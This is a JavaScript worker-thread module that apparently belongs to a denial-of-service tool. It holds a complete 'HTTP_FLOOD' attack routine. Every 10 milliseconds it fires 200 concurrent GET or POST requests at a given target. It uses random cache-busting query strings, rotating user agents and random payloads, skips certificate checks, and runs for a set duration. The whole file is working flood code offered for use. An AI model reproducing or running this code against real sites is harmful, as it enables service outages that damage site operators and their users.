import axios from "axios";
import https from "https";
import { parentPort, workerData } from "worker_threads";
import { randomString } from "../utils/randomUtils.js";

const CONCURRENT_REQUESTS = 200;
const REQUEST_DELAY = 10;

const httpsAgent = new https.Agent({
  rejectUnauthorized: false,
  keepAlive: true,
  maxSockets: 500,
});

const startAttack = () => {
  const { target, userAgents, duration, packetDelay, packetSize } = workerData;

  const fixedTarget = target.startsWith("http") ? target : `https://${target}`;
  console.log(`[HTTP_FLOOD] Target: ${fixedTarget}`);
  console.log(`[HTTP_FLOOD] Concurrent: ${CONCURRENT_REQUESTS}, Delay: ${REQUEST_DELAY}ms`);

  let totalPackets = 0;
  let successfulRequests = 0;
  let failedRequests = 0;
  const startTime = Date.now();

  const sendRequest = async (userAgent) => {
    const url = fixedTarget.replace(/\/$/, "") + "/?r=" + randomString(10);
    totalPackets++;

    try {
      await axios({
        method: Math.random() < 0.7 ? "GET" : "POST",
        url,
        data: Math.random() < 0.7 ? undefined : randomString(packetSize || 1024),
        headers: {
          "User-Agent": userAgent,
          "Cache-Control": "no-cache",
          "Accept": "*/*",
        },
        timeout: 10000,
        httpsAgent,
        validateStatus: () => true,
      });
      successfulRequests++;
    } catch {
      failedRequests++;
    }
  };

  const interval = setInterval(() => {
    const elapsed = (Date.now() - startTime) / 1000;

    if (elapsed >= duration) {
      clearInterval(interval);
      const rate = totalPackets > 0 ? ((successfulRequests / totalPackets) * 100).toFixed(1) : "0";
      parentPort.postMessage({
        log: `Complete - Requests: ${totalPackets}, Success: ${successfulRequests}, Failed: ${failedRequests}, Rate: ${rate}%`,
        totalPackets,
      });
      process.exit(0);
    }

    if (Math.floor(elapsed) % 3 === 0 && elapsed > 0) {
      parentPort.postMessage({
        log: `Requests: ${totalPackets} | Success: ${successfulRequests} | Failed: ${failedRequests}`,
        totalPackets,
      });
    }

    for (let i = 0; i < CONCURRENT_REQUESTS; i++) {
      const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
      sendRequest(userAgent);
    }
  }, REQUEST_DELAY);
};

if (workerData) {
  startAttack();
}
